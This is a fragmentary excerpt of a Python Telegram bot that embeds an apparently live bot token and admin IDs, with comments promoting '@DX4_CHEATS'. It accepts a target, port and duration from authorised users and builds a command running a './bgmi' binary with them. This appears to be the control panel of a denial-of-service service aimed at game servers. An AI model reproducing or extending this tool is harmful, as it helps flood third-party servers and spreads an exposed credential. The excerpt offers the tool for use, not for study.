...
bot = telebot.TeleBot('7098242977:AAE4v-KG6Xsnww3Gd-zSmENVAg1J3mt8Cro')

# Join :- @DX4_CHEATS # Admin user IDs
admin_id = ["5733795384","1958450722",""]
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Join :- @DX4_CHEATS # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./bgmi {target} {port} {time} 301"
